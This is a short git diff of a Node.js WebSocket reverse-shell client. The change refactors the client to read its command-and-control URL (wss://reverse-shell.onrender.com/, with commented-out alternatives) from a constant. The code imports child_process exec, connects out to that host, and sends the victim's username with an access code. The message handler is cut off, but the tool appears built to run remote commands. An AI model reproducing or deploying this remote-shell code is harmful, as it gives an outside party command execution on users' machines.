@@ -1,13 +1,15 @@
 const { exec } = require('child_process');
 var WebSocket = require('ws');
 
+//const serverAddress = "ws://192.168.0.240:8080"
+//const serverAddress = "wss://reverseshell-ondrejdostal007.b4a.run/"
+const serverAddress = "wss://reverse-shell.onrender.com/"
+
 const connect = () => {
-  //var ws = new WebSocket('ws://192.168.0.240:8080');
-  //var ws = new WebSocket('wss://reverseshell-ondrejdostal007.b4a.run/');
-  var ws = new WebSocket('wss://reverse-shell.onrender.com/');
+  var ws = new WebSocket(serverAddress);
   ws.on('open', () => {
       console.log("> Websocket connection established.")
-      console.log("> Connected to: wss://reverseshell-ondrejdostal007.b4a.run/")
+      console.log("> Connected to:", serverAddress)
       ws.send(JSON.stringify({ type: "id", value: require("os").userInfo().username, accessCode: "tvojemama" }))
   });
   ws.on('message', function(msg) {
